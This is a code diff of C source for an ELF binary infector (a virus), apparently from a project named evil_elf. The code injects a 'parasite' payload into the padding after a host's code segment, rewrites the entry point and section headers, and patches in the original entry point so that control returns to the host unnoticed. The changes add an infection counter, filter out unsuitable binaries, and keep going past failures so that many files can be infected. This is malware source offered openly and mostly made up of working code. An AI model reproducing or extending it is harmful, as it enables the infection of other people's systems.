@@ -73,6 +73,7 @@ Elf64_Addr		original_entry_point;			// Host entry point
 Elf64_Off		code_segment_end_offset;		// Location to inject parasite
 uint64_t   		host_file_size;					// Host binary size (on disk)
 
+unsigned int	infected_count = 0;				// An extern variable used in main()
 
 
 void ElfParser(char *filepath)
@@ -80,6 +81,13 @@ void ElfParser(char *filepath)
 
 	// Mapping host_binary in memory
 	void *host_mapping = mmapFile(filepath);
+
+
+	// SKIP Relocatable, files and 32-bit class of binaries
+	Elf64_Ehdr *binary_header = (Elf64_Ehdr *) host_mapping;
+    if ( binary_header->e_type == ET_REL ||
+         binary_header->e_type == ET_CORE ) {printf(CYAN"hahaha\n"RESET); return;}
+    if ( binary_header->e_ident[EI_CLASS] == ELFCLASS32 ) {printf(CYAN"YAAAA\n"RESET);return;}
 
 	
 	// Load Parasite into memory (from disk), uses extern 'parasite_path' defined in main.c implicitly
@@ -91,10 +99,10 @@ void ElfParser(char *filepath)
 	Elf64_Off padding_size = GetPaddingSize(host_mapping);
 	if (padding_size < parasite_size)
 	{
-		fprintf(stderr, RED"[+]"RESET" Host cannot accomodate parasite, parasite is angry "RED"x_x \n"RESET); 
-		exit(0x61);
+		fprintf(stderr, RED"[+]"RESET" Host "YELLOW"%s"RESET" cannot accomodate parasite, parasite is angry "GREEN"x_x \n"RESET, filepath); 
+		return;
 	}
-
+	
 
 	// Save original_entry_point of host and patch host entry point with parasite_offset
 	Elf64_Ehdr *host_elf_header = (Elf64_Ehdr *) host_mapping;
@@ -106,16 +114,51 @@ void ElfParser(char *filepath)
 	PatchSHT(host_mapping);
 
 
-	// Patch Parasite jmp-on-exit address	
-	printf("sizeof original_entry_point: %ld, value - 0x%lx\n", sizeof(original_entry_point), original_entry_point);
-	//FindAndReplace(parasite_code, 0xaaaaaaaa, original_entry_point);
-
+	// ?????????????????????????????????????????????????????????????????????????????????????????????
+	// Patch Parasite jmp-on-exit address. This step causing SIGSEGV. Since nearly all binaries are
+	// in the form of shared objects (which uses offsets instead of absolute addresses), we need to
+	// figure out the runtime address (rather than offset) of the first instruction the host 
+	// originally intended to execute at RUNTIME. This has to be calculated by our parasite code at
+	// RUNTIME since all modern systems come with mitigation called ASLR due to which the binary has
+	// a different runtime address each time it is loaded into memory.
+	// POSSIBLE Solution -  Parasite should include code that figures out what base address is the 
+	//						binary alloted at runtime so that it transfers the code back to the host
+	//						stealthily.						
+	FindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
+	// ????????????????????????????????????????????????????????????????????????????????????????????
 
 
 	// Inject parasite in Host
 	memcpy( (host_mapping + parasite_offset), parasite_code, parasite_size);
+	//DumpMemory(host_mapping + parasite_offset, parasite_size);
 
+
+	// Unmaping host
 	munmap(host_mapping, host_file_size);
+	++infected_count;
+}
+
+
+
+// Finds the placeholder (for address where our parasite code will jump after executing its body) and
+// writes the host's entry point (original entry point address) to it. This should silently transfer
+// the code flow to the original intended code after the parasite body executes.
+void FindAndReplace(uint8_t *parasite, long find_value, long replace_value)
+{
+	uint8_t *ptr = parasite;
+	
+
+	int i	= 0;
+	for (i=0 ; i < parasite_size ; ++i)
+	{
+		long current_QWORD = *((long *)(ptr + i));
+		
+		if ( !(find_value ^ current_QWORD) ) 
+		{
+			*((long *)(ptr + i)) = replace_value;
+			return;
+		}
+	}
 }
 
 
@@ -164,7 +207,7 @@ void PatchSHT(void *map_addr)
         }
 
 
-        // Find the last section of the CODE segment  
+		// Find the last section of the CODE segment  
 		else {
 
             char *current_section_name = (char *) (shstrtab_section + section_name_offset);
@@ -192,40 +235,39 @@ void PatchSHT(void *map_addr)
 // after CODE segment) 
 Elf64_Off GetPaddingSize(void *host_mapping)
 {   
-	
-	Elf64_Ehdr *elf_header = (Elf64_Ehdr *) host_mapping;
-    uint16_t pht_entry_count 	= elf_header->e_phnum;
+	Elf64_Ehdr *elf_header 		= (Elf64_Ehdr *) host_mapping;
+	uint16_t pht_entry_count 	= elf_header->e_phnum;
 	Elf64_Off pht_offset 		= elf_header->e_phoff;
 
 
 	// Point to first entry in PHT
-    Elf64_Phdr *phdr_entry = (Elf64_Phdr *)(host_mapping + pht_offset);
+	Elf64_Phdr *phdr_entry = (Elf64_Phdr *)(host_mapping + pht_offset);
 
 
-    // Parse PHT entries
-    uint16_t CODE_SEGMENT_FOUND = 0;
-    int i;
+	// Parse PHT entries
+	uint16_t CODE_SEGMENT_FOUND = 0;
+	int i;
 	for ( i = 0 ; i < pht_entry_count ; ++i)
-    {
+	{
 		// PF_X	(1 << 0)
 		// PF_W	(1 << 1)
 		// PF_R (1 << 2)
-        // Find the CODE Segment (containing .text section)
-        if (CODE_SEGMENT_FOUND  == 0		&&
+		// Find the CODE Segment (containing .text section)
+		if (CODE_SEGMENT_FOUND  == 0		&&
 			phdr_entry->p_type  == PT_LOAD	&&
-            phdr_entry->p_flags == (PF_R | PF_X) )
-        {
+			phdr_entry->p_flags == (PF_R | PF_X) )
+		{
 
-            CODE_SEGMENT_FOUND = 1;
+			CODE_SEGMENT_FOUND = 1;
 
-            // Calculate the offset where the code segment ends to bellow calculate padding_size 
-            code_segment_end_offset	= phdr_entry->p_offset + phdr_entry->p_filesz;
+			// Calculate the offset where the code segment ends to bellow calculate padding_size 
+			code_segment_end_offset	= phdr_entry->p_offset + phdr_entry->p_filesz;
 			parasite_offset			= code_segment_end_offset;
 
 
-            // Increase its p_filesz and p_memsz by parasite_size (to accomodate parasite)
-            phdr_entry->p_filesz = phdr_entry->p_filesz + parasite_size;
-            phdr_entry->p_memsz  = phdr_entry->p_memsz  + parasite_size;
+			// Increase its p_filesz and p_memsz by parasite_size (to accomodate parasite)
+			phdr_entry->p_filesz = phdr_entry->p_filesz + parasite_size;
+			phdr_entry->p_memsz  = phdr_entry->p_memsz  + parasite_size;
         
 		}
 
@@ -274,11 +316,11 @@ void LoadParasite()
 	// Initializing parasite_size and allocating space for parasite_code
 	parasite_size = statbuf.st_size;
 	parasite_code = (int8_t *)malloc(parasite_size);
-    if (parasite_code == NULL)
-    {
-        fprintf(stderr, "[-] evil_elf.c, InjectParasiteCode() : Out of memory\n");
-        exit(0x61);
-    }
+	if (parasite_code == NULL)
+	{
+		fprintf(stderr, "[-] evil_elf.c, InjectParasiteCode() : Out of memory\n");
+		exit(0x61);
+	}
 
 
 	// Load actual poison @ parasite_code (allocated memory on heap)
@@ -334,8 +376,8 @@ void DumpMemory(void *address, uint64_t size)
 	uint8_t		*iterator = address;
 	uint64_t	i;
 
-	for (i=0; i<size; ++i, ++iterator)
+	for (i=0; i<size; ++i)
 	{
-		fprintf(stdout, YELLOW"%02x "RESET, *iterator);
+		fprintf(stdout, YELLOW"%02x "RESET, *(iterator + i));
 	}
 }
